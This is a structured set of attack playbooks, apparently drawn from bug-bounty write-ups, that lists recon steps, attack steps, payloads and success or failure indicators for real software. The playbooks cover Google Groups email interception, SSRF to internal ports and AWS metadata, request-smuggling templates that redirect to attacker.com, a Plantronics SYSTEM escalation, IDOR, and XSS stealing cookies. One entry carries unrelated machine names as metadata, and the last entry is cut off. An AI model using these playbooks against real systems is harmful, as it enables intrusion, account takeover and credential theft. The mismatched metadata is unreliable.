payloads_or_patterns: Target service registration/recovery pages: https://slack.com/signin/find, https://www.yammer.com/signup/, https://work.workplace.com/, https://twitter.com/account/begin_password_reset, https://www.facebook.com/login/identify/, https://www.instagram.com/accounts/password/reset/
tools_recommended: Browser with incognito mode for managing multiple sessions.
Burp Suite to intercept and analyze requests/responses during the registration/recovery process.
A list of common external services that might integrate with or send emails to Google Groups.
success_indicators: Successfully registering an account on an external service using a fabricated Google Group email address.
Gaining access to an external service account via a password reset or recovery link sent to the Google Group.
Extracting sensitive information (credentials, PII) from email snippets found through Google Groups search.
failure_indicators: No public Google Groups found for the target domain, or all lists are private (Method A).
External services do not send emails to the fabricated Google Group address, or emails are not delivered.
Confirmation links or recovery codes are not received or do not lead to account takeover.
Google Groups search does not yield any sensitive email snippets (Method B).
Action: If Method A fails due to email delivery issues, investigate if there are specific posting restrictions or sender allowlists on the Google Group.

playbooks.impact: Account takeover of external services (e.g., Slack, Twitter, Facebook) by exploiting the ability to receive password reset or registration emails directed to a Google Group mailing list. This can lead to data breaches, unauthorized access, and further exploitation.
playbooks.key_lesson: When a mailing list service allows public posting and viewing, it can be abused to intercept emails intended for account recovery or registration of external services, leading to account takeover.

meta.title: From . in regex to SSRF — part 2

trigger_conditions.when_to_apply: When a web application takes a URL as input, processes it for image conversion, and performs a domain name check that can be bypassed, and the underlying service uses a Node.js library like node-fetch.
prerequisites: Attacker has registered a domain name that can be CNAME'd to an attacker-controlled server.
The target service allows requests to arbitrary domains, not just whitelisted ones.
applicability_signals: The /image-converter/ endpoint is present.
The application appears to process external URLs.
The User-Agent header indicates Node.js or node-fetch.
The target service does not strictly validate URLs, allowing for custom redirects.
skip_if: The application strictly validates URLs against a known-good list.
All requests to internal IPs or private IP ranges are blocked by a WAF or the application itself.
The User-Agent indicates a different technology that is not susceptible to the same redirect-based SSRF.

recon_steps: Step 1: Identify the image converter endpoint, e.g., `https://api.example.org/image-converter/`.
Step 2: Observe the User-Agent header of requests made by the target service when processing URLs to confirm it's Node.js/node-fetch.

Step 3: Attempt to pass a custom domain name that is CNAME'd to an attacker-controlled server to the image converter endpoint to verify the domain check bypass, e.g., `https://api.example.org/image-converter/https://www-example.org`.
attack_steps: Step 1: Set up an HTTP server on an attacker-controlled machine capable of issuing HTTP 302 redirects. The server should respond to requests to `/` by redirecting to a given URL in the `Location` header.

Step 2: Craft a URL to the target endpoint that includes a redirect to an internal IP address and port, URL-encoded to bypass any character restrictions. Example: `https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F127.0.0.1%3A80%2F`.
Step 3: Use a tool like `ffuf` or Burp Intruder to systematically scan ports on `127.0.0.1` (or other internal IPs) by replacing `:80` with a port range (e.g., `1-65535`).
Step 4: If internal services are discovered (e.g., `redis.example.org`), use `ffuf` to scan for common internal hostnames by replacing `127.0.0.1` with fuzzable subdomains like `FUZZ.example.org`.

Step 5: Attempt to access cloud metadata services by using the AWS internal IP `169.254.169.254`, e.g., `https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F169.254.169.254%3A80%2F`.
tools_recommended: Python http.server (for custom redirects)
ffuf (for port scanning and host enumeration)
Burp Suite Intruder (alternative for scanning)
success_indicators: Receiving a response other than a 404 or connection refused when scanning internal ports, indicating a service is listening.
Observing connections to the attacker-controlled HTTP server from internal IP addresses (e.g., `redis.example.org`).
Successful connection and response from `169.254.169.254`, indicating AWS metadata service is reachable.
Blind SSRF confirmed by observing any response that deviates from expected behaviour (e.g., a different status code, content, or response time when scanning ports).
failure_indicators: Receiving 404s for all scanned ports: The target application might not be performing redirects as expected or the service is not running on those ports. Try different redirect strategies or other SSRF vectors.

Receiving 502 Bad Gateway or connection refused for all requests: The application might be sanitizing URLs aggressively or blocking outbound requests entirely. Re-evaluate the domain check bypass and consider alternative SSRF techniques.
No responses from `169.254.169.254`: The service might not be running on AWS or network segmentation prevents access to metadata. Investigate other cloud provider metadata endpoints if applicable.

playbooks.impact: Attacker can scan internal network ports, discover internal services (e.g., Redis), and potentially access sensitive cloud provider metadata (e.g., AWS EC2 instance credentials), leading to further compromise.
playbooks.key_lesson: Always test for HTTP redirect functionality when dealing with URL input, as it can be a primary vector for blind SSRF, enabling internal network scanning and sensitive data exfiltration.

meta.title: Pwning Avast Secure Browser for fun and profit

trigger_conditions.when_to_apply: When Avast Secure Browser with a vulnerable version of the Video Downloader extension (prior to 1.5) is installed on a user's system.
prerequisites: User must have Avast Secure Browser installed.
User must have the Video Downloader extension enabled (it's enabled by default and cannot be disabled by regular means).
applicability_signals: Manifest of the Video Downloader extension contains 'script-src 'self' 'unsafe-eval'; object-src 'self'' in content_security_policy.
Extension has extensive permissions listed in its manifest.
skip_if: Video Downloader extension is updated to version 1.5 or later.
Avast Secure Browser has been uninstalled.

recon_steps: Step 1: Identify the presence of Avast Secure Browser on the target system.

Step 2: Inspect the loaded extensions within Avast Secure Browser to determine the version of the 'Video Downloader' extension. This might require inspecting browser internals or manifest files if accessible.
attack_steps: Step 1: Craft a malicious website that, when visited by a user with the vulnerable Avast Secure Browser, injects JavaScript code into the Video Downloader extension's context. This is possible due to the permissive 'content_security_policy'.
Step 2: Within the injected JavaScript, leverage the extension's broad permissions to interact with the Avast Antivirus application's communication interface.
Step 3: Exploit the vulnerability in the command starting 'Banking Mode' to inject arbitrary command-line flags into the Avast Antivirus process.
Step 4: Use the injected command-line flags to execute local applications with the user's privileges.
payloads_or_patterns: Malicious JavaScript to be injected into extension context (specific payload depends on exploit details not fully provided).

Commands to trigger Avast Antivirus's 'Banking Mode' with arbitrary flags. Example structure: `chrome.runtime.connectNative('avast.browser.extension').postMessage({'command': 'startBankingMode', 'flags': ['--evil-command', 'arg1']});` (Illustrative, actual method might differ).
tools_recommended: Burp Suite (for crafting malicious web pages and intercepting traffic if applicable to extension communication).
Browser developer tools (to inspect extension manifests and potential injection points).
Custom scripting (Python, JavaScript) to automate the generation of malicious payloads and exploit sequences.
success_indicators: Arbitrary command execution on the victim's operating system (e.g., creating a file, executing `calc.exe`).
Installation of malware without user interaction.
failure_indicators: No JavaScript execution within the extension context (indicating a lack of the initial vulnerability or CSP bypass).
Avast Antivirus process does not respond to the crafted commands or rejects invalid flags (indicating the second vulnerability is patched or not exploitable in this manner).
Response code 403 or similar from Avast Antivirus communication channel.

playbooks.impact: Complete compromise of the user's system, allowing for arbitrary code execution, malware installation, data theft, and full control over the victim's machine.
playbooks.key_lesson: Thoroughly investigate custom browser extensions, especially those with overly broad permissions or insecure Content Security Policies, as they can serve as a critical pivot point for system-level compromise.

meta.title: Google Chrome display locking fuzzing

affected_components: Display Locking Mechanism (potentially within the rendering engine or UI layer)

trigger_conditions.when_to_apply: This technique is applicable when fuzzing the display locking mechanism of Google Chrome, which may be triggered by specific sequences of browser operations or malicious web content.
prerequisites: A vulnerable version of Google Chrome is installed.
applicability_signals: Targeting the browser's internal mechanisms related to display locking or screen blanking.
skip_if: The target is not a desktop application, or not specifically Google Chrome.
No known vulnerabilities exist in the display locking mechanism.

recon_steps: Step 1: Identify the specific code paths or APIs within Chrome related to display locking or screen blanking.
Step 2: Analyze the browser's behavior when these features are invoked under various conditions (e.g., during page loads, navigation, or specific user interactions).
attack_steps: Step 1: Develop or obtain a fuzzer specifically designed to target the display locking functionality.
Step 2: Execute the fuzzer against Google Chrome, providing a wide range of malformed or unexpected inputs.
Step 3: Monitor Chrome for crashes or unexpected behavior indicative of memory corruption (e.g., Use-After-Free).
Step 4: If a crash is reproducible, analyze the crash dump to confirm the Use-After-Free vulnerability and its potential exploitability.
payloads_or_patterns: Fuzzing inputs targeting display locking APIs/functions (specific payloads depend on fuzzer implementation and target functions)
tools_recommended: Custom fuzzers
Chrome DevTools for observing browser behavior
Debuggers (e.g., GDB, WinDbg) for analyzing crashes
success_indicators: Browser crash reporting a Use-After-Free vulnerability.
Observed memory corruption or abnormal program termination during fuzzing.
failure_indicators: No crashes or exploitable behavior observed after extensive fuzzing. Pivot to fuzzing other Chrome components.
Fuzzer encountering exceptions unrelated to memory corruption.

playbooks.impact: Remote code execution or denial of service within the context of the vulnerable Chrome process.
playbooks.key_lesson: Fuzz browser-specific mechanisms like display locking to uncover memory corruption vulnerabilities that may lead to RCE.

meta.title: From . in regex to SSRF — part 1

tech_stack_fingerprints: "Cannot read property 'groups' of null" error message

trigger_conditions.when_to_apply: When a service accepts URLs or domain-like structures as parameters and exhibits a regex-based domain whitelisting mechanism.
prerequisites: Discovery of an image processing or conversion service.
applicability_signals: Service accepts URL-like parameters, even if not immediately obvious.
Error messages related to regex processing (e.g., 'Cannot read property 'groups' of null').
Domain whitelisting is suspected or confirmed.
skip_if: The service strictly validates input and does not allow any deviation from expected URL formats.
No discernible regex-based filtering is present or can be bypassed.

recon_steps: Step 1: Identify services that process external resources or URLs.
Step 2: Probe such services with various simple parameters (e.g., ?url=, ?width=, ?name=) to observe responses and error messages.
Step 3: Analyze error messages for clues about the underlying implementation, such as JavaScript regex errors.
attack_steps: Step 1: Craft a request to the image-converter endpoint using a non-standard URL format identified during recon, including a target URL after a query parameter. Example: GET https://api.example.org/image-converter/width=100/http://google.com
Step 2: Observe the response. If a whitelisting mechanism is in place, attempt to bypass it by leveraging a regex vulnerability.

Step 3: Identify known whitelisted domains (e.g., www.example.org). Construct a request using a manipulated domain name that might bypass the regex. Example: GET https://api.example.org/image-converter/width=100/https://www-example.org
Step 4: If the regex is vulnerable (e.g., it allows 'www-example.org' instead of 'www.example.org'), register a domain matching the bypass pattern (e.g., www-example.com).
Step 5: Use the registered domain in the SSRF request to confirm the bypass and achieve SSRF. Example: GET https://api.example.org/image-converter/width=100/https://www-example.com
tools_recommended: Arjun: for automated parameter discovery.
A domain registration service: to register attacker-controlled domains.
success_indicators: The service processes the request with the attacker-controlled domain/URL.
Receiving an image or other content from the attacker-controlled server instead of an error.
Successful confirmation of SSRF by observing network traffic to the attacker-controlled server.
failure_indicators: Consistent 403 Forbidden responses or errors indicating invalid URL formats after multiple bypass attempts.
Service consistently returns errors related to domain validation, suggesting a robust whitelisting mechanism.
Suggestion: If regex bypass fails, investigate other potential SSRF vectors or exploitation methods.

playbooks.impact: The attacker can trick the server into making requests to arbitrary internal or external resources, potentially leading to information disclosure, unauthorized access to internal services, or further exploitation of network vulnerabilities.
playbooks.key_lesson: When encountering services that process URLs, analyze error messages for clues about regex implementations, as vulnerabilities in these can lead to SSRF through domain whitelisting bypasses.

meta.title: Account takeover via HTTP Request Smuggling
meta.programs: RedCross, Vault, Teacher, Netmon, Chaos, Carrier, Querier, Lightweight, FriendZone, Arkham, Giddy, SwagShop, Access, Conceal, Flujab, LaCasaDePapel, Irked, Fortune, Ypuffy, OneTwoSeven, SecNotes, Help, Frolic, Curling
meta.vuln_type: HTTP Request Smuggling | Internal Header Disclosure | Open Redirect | Account Takeover

trigger_conditions.when_to_apply: When a web application is vulnerable to HTTP Request Smuggling using TE.CL and discloses internal headers via an open redirect mechanism.
prerequisites: The target system must be vulnerable to HTTP Request Smuggling with TE.CL.
The target system must have a login endpoint that performs redirection based on input parameters.
The redirection mechanism must be controllable and reflect internal headers in the Location header.
applicability_signals: Confirmation of TE.CL vulnerability using Burp's Request Smuggler plugin or manual testing.
A login endpoint with parameters like 'onerror' and 'onsuccess' that control redirection.
The 'onerror' or similar parameter's value appears in the 'Location' header of the response during a redirection.
skip_if: No confirmation of TE.CL vulnerability.
No controllable redirection mechanism or sensitive headers are reflected.
WAF blocks requests attempting to smuggle.

recon_steps: Step 1: Use Burp Suite's Request Smuggler plugin to test for TE.CL vulnerability. Send a crafted request with both `Content-Length` and `Transfer-Encoding: chunked` headers, ensuring the `Transfer-Encoding` takes precedence on the front-end and `Content-Length` on the back-end.
Step 2: Analyze responses to confirm the smuggled request is processed by the back-end and affects subsequent requests. Look for unexpected responses or errors on subsequent requests.
attack_steps: Step 1: Craft a smuggled request targeting the `/login` endpoint. The smuggled part should include a `POST` request to `/login` with controlled `onerror` parameter, aiming to reveal internal headers. The outer request should trigger the smuggling mechanism.

Step 2: Send the crafted smuggled request. The smuggled `POST /login` request, when processed by the back-end, should trigger a redirection. The `onerror` parameter within this smuggled request should be manipulated to include a path that, when reflected in the `Location` header, reveals internal headers.

Step 3: Capture the response containing the redirected URL. Analyze the `Location` header for internal headers like `X-Forwarded-For` or other sensitive information that might reveal internal network structures or user details.

Step 4: Based on the disclosed internal information, if user IDs or other sensitive parameters are revealed, attempt to leverage this information for further attacks (e.g., IDOR if user IDs are present). If an open redirect is confirmed, combine it with the request smuggling to target a specific user's session or account.
payloads_or_patterns:
Smuggled Request Template:
POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 4
Transfer-Encoding: chunked

AE
POST /login HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

onsuccess=account.html&username=admin&password=12345&onerror=http://attacker.com/redirect?headers=
0

Victim Request Template:
GET / HTTP/1.1
Host: <TARGET_URL>

Internal Header Disclosure Payload Example (modify Content-Length): 
POST / HTTP/1.1
Host: <TARGET_URL>
Content-Length: 4
Transfer-Encoding: chunked

AE
POST /login HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

onsuccess=account.html&username=admin&password=12345&onerror=http://<INTERCEPTING_PROXY_OR_COLLABORATOR_INTERCEPT_URL>/smuggled_login
0
tools_recommended: Burp Suite (Request Smuggler plugin, Repeater, Intruder)
Turbo Intruder (for scripting complex request sequences)
Collaborator client (for catching external callbacks)
success_indicators: A 302 Found response where the `Location` header contains internal headers (e.g., `X-Forwarded-For`, `X-Real-IP`, or internal paths) reflecting the crafted smuggled request.
Successful redirection to an attacker-controlled domain containing leaked internal information.
Account takeover confirmed by manipulating parameters based on leaked information or through the open redirect to a malicious login page.
failure_indicators: No TE.CL vulnerability confirmed (all requests processed as expected). → Re-evaluate smuggling techniques or look for other vulns.
No internal headers reflected in the `Location` header or the `onerror` parameter is sanitized. → Try different smuggling techniques or payload variations.
403 Forbidden responses on smuggled requests. → WAF may be present, try different smuggling strategies or encodings.

playbooks.impact: Account takeover of any user by chaining HTTP Request Smuggling, internal header disclosure, and an open redirect. An attacker can intercept sensitive information or redirect users to malicious pages, potentially leading to credential theft or session hijacking.
playbooks.key_lesson: Always test for HTTP Request Smuggling on systems that handle `Content-Length` and `Transfer-Encoding` headers, especially when combined with redirection functionalities that can leak internal request details.

meta.title: Exploiting Wi-Fi Stack on Tesla Model S
meta.category: wifi hacking, driver hacking, RCE, memory corruption

target_profile.technology: Tesla Model S Wi-Fi Module (Parrot FC6050W)

trigger_conditions.when_to_apply: When an attacker can initiate a connection to the Tesla's Wi-Fi network.
prerequisites: Target Tesla Model S is within Wi-Fi range.
Target Tesla Model S is connected to or broadcasting a Wi-Fi network that the attacker can join.
applicability_signals: Target device is a Tesla Model S.
The vehicle is connected to a Wi-Fi network.
The Wi-Fi module is identified as a Marvell 88W8688.
skip_if: The Wi-Fi module is not a Marvell 88W8688.
The vehicle is not connected to any Wi-Fi network and not broadcasting one.

recon_steps: Step 1: Identify the Wi-Fi chipset on the Tesla Model S. Look for fingerprints related to Marvell 88W8688.
Step 2: Analyze the firmware download process for the Marvell 88W8688 chipset, specifically 'sd8688_helper.bin' and 'sd8688.bin'.
Step 3: If possible, obtain the firmware version 'sd8688-B1, RF868X, FP44, 13.44.1.p49' for analysis.
attack_steps: Step 1: Identify vulnerabilities in the Wi-Fi firmware and driver of the Marvell 88W8688 chipset.
Step 2: Craft a malicious firmware or driver update that exploits identified vulnerabilities.
Step 3: Deliver the malicious update to the Parrot module (FC6050W) through the Wi-Fi connection.
Step 4: Trigger code execution on the host Linux system of the Parrot module by combining vulnerabilities.
tools_recommended: Firmware analysis tools (e.g., Ghidra, IDA Pro)
Debugging tools for embedded systems
Network traffic analysis tools
success_indicators: Remote code execution on the Tesla's host Linux system.
Compromise of the in-vehicle system.
failure_indicators: Attempts to deliver malicious firmware are rejected by the device.
Vulnerabilities do not lead to exploitable conditions.
The Wi-Fi stack does not allow for remote manipulation of firmware.

playbooks.impact: Remote Code Execution (RCE) on the Tesla Model S in-vehicle system, allowing an attacker to compromise the host Linux system of the Wi-Fi module.
playbooks.key_lesson: Investigate third-party modules and their firmware for vulnerabilities that can lead to RCE on the main vehicle system.

meta.title: Admin capabilities around your ears

trigger_conditions.when_to_apply: When a non-administrative user can trigger an update process for Plantronics Hub, and the update service runs with elevated privileges.
prerequisites: Plantronics Hub for Windows installed (prior to version 3.14)
User has permissions to create files in C:\ProgramData\Plantronics\Spokes3G\
applicability_signals: Plantronics Hub GUI allows initiating an application update.
SpokesUpdateService.exe process is running with elevated privileges.
PLTHub.exe process runs as a standard user.
ProcMon shows SpokesUpdateService.exe monitoring C:\ProgramData\Plantronics\Spokes3G\MajorUpgrade.config.
skip_if: Plantronics Hub is updated to version 3.14 or later.
The update executable is not signed with the correct certificate.

recon_steps: Step 1: Install an older version of Plantronics Hub for Windows on a test system.
Step 2: Launch Process Monitor (ProcMon) and filter for processes related to Plantronics Hub (PLTHub.exe) and the update service (SpokesUpdateService.exe).

Step 3: Trigger an application update via the Plantronics Hub GUI and observe file system and process activity in ProcMon, specifically looking for the `MajorUpgrade.config` file in `C:\ProgramData\Plantronics\Spokes3G\` being monitored by `SpokesUpdateService.exe`.
attack_steps: Step 1: Identify the location `C:\ProgramData\Plantronics\Spokes3G\` and the file `MajorUpgrade.config`.
Step 2: Stop the `SpokesUpdateService.exe` service.
Step 3: Create a file named `MajorUpgrade.config` in `C:\ProgramData\Plantronics\Spokes3G\` with the content `<username>|advertise|<path to exe>`.
Step 4: Modify the `<path to exe>` to `C:\Windows\System32\cmd.exe`.
Step 5: Restart the `SpokesUpdateService.exe` service.
Step 6: Observe for an elevated command prompt, indicating successful privilege escalation.
tools_recommended: Process Monitor (ProcMon): For observing file system and process activity.
Microsoft Sysinternals Suite: For ProcMon and other diagnostic tools.
A tool to stop and start Windows services (e.g., `services.msc` or `sc.exe` command-line utility).
success_indicators: An elevated command prompt (system privileges) appearing after restarting the `SpokesUpdateService.exe` service.
The `cmd.exe` process running with SYSTEM privileges.
failure_indicators: The `MajorUpgrade.config` file is not created or accessible.
The `SpokesUpdateService.exe` does not execute the payload.
The `SpokesUpdateService.exe` performs signature validation and rejects the created config file.

The update process completes without a command prompt appearing. Pivot to checking if the update executable signature validation can be bypassed (e.g., downgrade attack, but the writeup states this failed).

playbooks.impact: An unprivileged user can execute arbitrary commands with SYSTEM privileges on the target machine, allowing for full system compromise.
playbooks.key_lesson: When a non-administrative user can trigger an update process for an application where the update service runs with elevated privileges, investigate the update mechanism for insecure file handling or configuration loading that can be manipulated to execute arbitrary code.

meta.title: Story of an IDOR via HTTP

trigger_conditions.when_to_apply: This technique applies when an authenticated user can trigger notifications (e.g., for comments or shared decks) and the notification endpoints accept a list of recipient IDs.
prerequisites: Attacker has an authenticated session.
Target application uses a notification system for comments or shared items.
applicability_signals: Endpoints that accept JSON payloads with recipient IDs.
Parameters like 'recipients' which is an array of objects containing 'type' and 'id'.
skip_if: Recipient IDs are validated against the authenticated user's own ID.
The application does not allow modifying recipient lists for notifications.

recon_steps: Capture authenticated HTTP requests related to sharing a deck or commenting.
Analyze the request body to identify parameters related to recipients and their IDs.
attack_steps: Step 1: Identify the endpoint used for sending notifications (e.g., deck sharing or comment notification).
Step 2: Intercept a legitimate request and observe the JSON payload structure, paying close attention to the 'recipients' array and the 'id' field within it.
Step 3: Modify the 'recipients' array to include the IDs of other users. For deck sharing, the 'type' should be 'User'. For comments, it can also be 'User'.
Step 4: For comment notifications, if the 'recipients' array is initially empty, add other user IDs.
Step 5: Send the modified request using an authenticated session.
Step 6: If the goal is to send a comment notification on behalf of another user, modify the 'commenterId' in the payload to another user's ID and send the request.

payloads_or_patterns.description: Deck Share Notification with Multiple Recipients
Send Comment Notification on behalf of another user

tools_recommended: Burp Suite: Repeater or Intruder to modify recipient IDs.
Postman: For crafting and sending specific HTTP requests.
success_indicators: The target user receives a notification for a deck share or comment that was not intended for them.
The 'senderProfileImage' or 'commenterId' in the notification payload reflects the details of an attacker-specified user, even if the actual comment/share was initiated by the attacker.
failure_indicators: Requests return 400 or 403 errors indicating invalid input or lack of authorization.
Notifications are only sent to the authenticated user's own recipient list.
The 'commenterId' cannot be changed or is ignored. Suggestion: Focus on manipulating the 'recipients' array for notification delivery.

playbooks.impact: The attacker can send notifications to any user, potentially causing confusion, spamming users, or impersonating another user in comment notifications. This could lead to social engineering attacks or denial of service for notification systems.
playbooks.key_lesson: Always test recipient selection mechanisms in notification features for Insecure Direct Object References (IDOR) by attempting to assign notifications to arbitrary user IDs.

meta.title: Exploiting HTML Injection in Email

trigger_conditions.when_to_apply: When a comment notification feature reflects user-provided content (like comments or titles) directly into the email body without proper sanitization.
prerequisites: Attacker must be able to post a comment or influence a 'presentationTitle' field that triggers an email notification.
applicability_signals: The presence of parameters like 'comment' and 'presentationTitle' in the JSON payload that is reflected in notification emails.
The ability to view the original source of an email to inspect its raw HTML content.
skip_if: Email content is strictly plain text or all HTML tags are stripped/encoded.

recon_steps: Step 1: Interact with the comment feature to trigger a notification email.
Step 2: Examine the raw HTML source of the received notification email by clicking 'Show Original'.
attack_steps: Step 1: Identify which parameters from user input (e.g., comment, presentationTitle) are reflected in the email body.
Step 2: Craft an HTML payload to inject into one of these parameters.
Step 3: Submit the crafted payload as part of a comment or presentation title.
Step 4: Trigger the notification email.
Step 5: Inspect the received email's raw HTML source to confirm successful injection.
payloads_or_patterns:
This is a test comment

View Deck
tools_recommended: Browser developer tools: To inspect network requests and response payloads.
Email client with 'Show Original' functionality.
success_indicators: The injected HTML (e.g., divs, links, styling) is rendered and visible in the received email, as seen in the 'supernatural one' screenshot.
The email client interprets and displays the injected HTML elements and styles.
failure_indicators: Injected HTML is displayed as plain text or is stripped/encoded in the email body. Consider trying different HTML tags or attributes, or looking for other input vectors.
Email client refuses to render the HTML or shows a security warning about potentially unsafe content.

playbooks.impact: The attacker can inject arbitrary HTML into emails sent to other users, potentially leading to phishing attacks, defacement of email content, or even cross-site scripting (XSS) if the email client has vulnerabilities in its HTML rendering engine.
playbooks.key_lesson: Always sanitize and strictly validate any user-supplied HTML content before embedding it into outgoing email notifications to prevent HTML injection vulnerabilities.

meta.title: Exploiting a Self Stored XSS with an IDOR

trigger_conditions.when_to_apply: When an application allows authenticated users to manage suppliers, and the supplier name field is susceptible to XSS, and supplier IDs are sequentially predictable and not properly access-controlled.
prerequisites: Authenticated user session
Ability to request new suppliers
Ability to view, edit, or delete suppliers of other users
applicability_signals: Supplier request form with a 'Name of supplier' field
API endpoint for managing suppliers that accepts incremental IDs
Responses reveal predictable numeric IDs for suppliers
skip_if: WAF blocks XSS payloads in the 'Name of supplier' field
Supplier IDs are not sequential or are not guessable
Edit/delete operations are properly access-controlled and only allow modification of the authenticated user's own suppliers

recon_steps: Step 1: Identify the supplier request feature and note the parameters involved, particularly the 'Name of supplier' field.
Step 2: Submit a request for a new supplier with a simple payload like '<script>alert(1)</script>' in the 'Name of supplier' field. Observe if any immediate alert or abnormal behavior occurs.
Step 3: Attempt to delete the newly created supplier and observe if the XSS payload executes in a pop-up, indicating a self-stored XSS.

Step 4: Identify API endpoints related to viewing, editing, or deleting suppliers. Test for IDOR by changing numeric IDs in requests (e.g., GET /api/suppliers/<id>, PUT /api/suppliers/<id>, DELETE /api/suppliers/<id>).
attack_steps: Step 1: Inject a cross-site scripting payload into the 'Name of supplier' field for a new supplier request, targeting a known incremental ID of another user (e.g., if user A has supplier ID 123, find an ID that belongs to user B). Example payload: <script>alert(document.cookie)</script>
Step 2: Submit the supplier request with the XSS payload in the name.

Step 3: Attempt to trigger the execution of the XSS payload by performing an action on the compromised supplier request, such as deleting it. This action should be performed using an authenticated session that belongs to the target user whose supplier request was modified.
Step 4: Observe for the execution of the XSS payload, confirming successful exploitation.
tools_recommended: Burp Suite: Repeater to test IDOR vulnerabilities by modifying supplier IDs, and to craft XSS payloads. Collaborator client for detecting out-of-band interactions.
success_indicators: An alert box pops up containing 'document.domain' or other sensitive information (e.g., cookies) when viewing or deleting the supplier request.
A request is received at Burp Collaborator from the target application when the XSS payload executes.
failure_indicators: No XSS execution occurs after triggering delete/edit operations → XSS payload may be sanitized or the IDOR does not allow modification of the name field for other users. Consider trying different XSS payloads or alternative IDOR vectors.
403 Forbidden or 401 Unauthorized when attempting to modify/delete another user's supplier → IDOR is not present or is patched. Focus on the self-stored XSS aspect if it can be triggered in any way.

playbooks.impact: An attacker can execute arbitrary JavaScript in the browser of another authenticated user when they interact with a supplier request they manage. This can lead to session hijacking, data exfiltration, performing actions on behalf of the user, or redirecting the user to a malicious site.
playbooks.key_lesson: When an IDOR allows modification of user-controlled input fields, combine it with XSS payloads in those fields to compromise other users who interact with that modified data.

meta.title: XSS Is Love <3 !

trigger_conditions.when_to_apply: When a web application accepts user input without proper sanitization and reflects it back in the response, allowing for client-side script execution.
prerequisites: The target application must be vulnerable to Cross-Site Scripting.
applicability_signals: Input parameters or fields that are reflected in the HTTP response without encoding.
skip_if: Input is properly sanitized and encoded, or WAF blocks common XSS payloads.

recon_steps: Step 1: Identify all input fields and parameters that the application accepts (e.g., URL parameters, form fields, POST data).
Step 2: Observe how these inputs are reflected in the application's response. Look for unescaped characters like `<`, `>`, `"`, `'`.
attack_steps: Step 1: Inject a basic XSS payload like `<script>alert(1)</script>` into an identified input parameter.
Step 2: Observe the application's response to see if the payload is executed in the browser.
Step 3: If the basic payload is blocked or not executed, try different encoding techniques or bypasses (e.g., using HTML entities, different tag structures, or event handlers).
tools_recommended: Burp Suite: Repeater and Intruder to test various payloads systematically.
OWASP ZAP: Similar to Burp Suite for automated scanning and manual testing.
success_indicators: Execution of JavaScript code, such as an `alert()` box displaying a message or the domain name.
Unexpected rendering of HTML or JavaScript within the page content.
failure_indicators: Input is displayed as plain text (e.g., `<script>alert(1)</script>`).
A 403 Forbidden or similar error response is received.
The payload does not execute and no observable changes occur. Pivot to testing other input vectors or different types of vulnerabilities.

playbooks.impact: Allows an attacker to execute arbitrary JavaScript code in the victim's browser within the context of the vulnerable website. This can lead to session hijacking, phishing attacks, defacement, redirection to malicious sites, and stealing sensitive information displayed on the page.
playbooks.key_lesson: Always sanitize and properly encode user-supplied input before reflecting it back into HTML responses to prevent XSS vulnerabilities.

meta.title: BugBounty | A Dom Xss

trigger_conditions.when_to_apply: When a JavaScript file makes an AJAX GET request and directly uses `location.pathname` to construct the request URL, and the response is written to the page without proper sanitization.
prerequisites: The target website uses jQuery for AJAX requests.
The AJAX request URL is constructed using `location.pathname`.
applicability_signals: Existence of a JS file that performs AJAX GET requests.
AJAX request URL is dynamically built using `location.pathname`.
The success callback of the AJAX request processes the `res` object without sufficient sanitization.
skip_if: The `location.pathname` is not used in the AJAX request URL construction.
The AJAX response is strictly sanitized before being rendered.
The target is protected by a robust WAF that can detect malicious `location.pathname` manipulations.

recon_steps: Step 1: Analyze JavaScript files served by the target for AJAX requests, specifically looking for GET requests that construct URLs using `location.pathname`.
Step 2: Examine the success callback function of identified AJAX requests to understand how the response (`res`) is processed and rendered on the page.
attack_steps: Step 1: Craft a malicious URL where `location.pathname` is set to `//<attacker_domain>/<original_path>`, e.g., `https://www.xxxxx.com//attacker.com/xxxxxxxxx`.
Step 2: Set up an attacker-controlled web server at `<attacker_domain>` that serves content containing an XSS payload (e.g., `<script>alert(1)</script>`).
Step 3: Ensure the attacker's server includes appropriate CORS headers (`Access-Control-Allow-Origin: *`) to allow the cross-origin AJAX request.
Step 4: Instruct a victim to visit the crafted malicious URL.
tools_recommended: Burp Suite or OWASP ZAP: To intercept and modify requests, and to analyze JavaScript files.
A simple HTTP server (e.g., Python's http.server, Node.js http-server): To host the malicious payload on the attacker's domain.
success_indicators: The XSS payload executes in the victim's browser (e.g., an alert box appears).
Browser developer console shows the AJAX request successfully retrieving content from the attacker's domain.
The response from the attacker's domain is rendered on the victim's page.
failure_indicators: Victim's browser navigates to the attacker's domain directly instead of making an AJAX call (if `location.pathname` is not properly handled by the script).
AJAX request fails with a CORS error or is blocked by browser security policies.
The rendered response from the attacker's domain is sanitized, preventing XSS execution.
Target URL returns a 404 or other error when the `//attacker.com` prefix is used.

playbooks.impact: Cross-site Scripting (XSS) allows an attacker to execute arbitrary JavaScript in the victim's browser, leading to session hijacking, data theft, defacement, or phishing.
playbooks.key_lesson: Always sanitize or properly encode data that is sourced from `location.pathname` and used in dynamic URL construction for AJAX requests, as it can be controlled by the attacker to redirect requests and inject payloads.

meta.title: Microsoft Edge (Chromium) - EoP via XSS to Potential RCE

trigger_conditions.when_to_apply: This technique is applicable when the New Tab Page (NTP) of Microsoft Edge (Chromium) is served from an external URL and does not properly sanitize HTML content in the titles of 'top sites'.
prerequisites: The target is running Microsoft Edge (Chromium) with default settings, where the NTP is `https://ntp.msn.com/edge/ntp`.
applicability_signals: The presence of an external URL for the New Tab Page (e.g., `https://ntp.msn.com/edge/ntp`).
Observation of HTML tags rendered within the titles of 'top sites' on the NTP.
skip_if: If the New Tab Page is served locally or if HTML tags in 'top site' titles are properly sanitized.

recon_steps: Step 1: Navigate to the Microsoft Edge (Chromium) New Tab Page (NTP) at `https://ntp.msn.com/edge/ntp`. Observe the 'top sites' section.
Step 2: Visit various websites and check if their titles appear in the 'top sites' section of the NTP. Verify if any HTML tags in the visited website's title are rendered on the NTP.
attack_steps: Step 1: Identify a website with an HTML tag in its title (e.g., `Test`).
Step 2: Visit this website. It should appear in the 'top sites' section of the Edge NTP with the HTML tag rendered.
Step 3: Open the Developer Tools on the NTP page and inject JavaScript to access the `window.chrome` object.
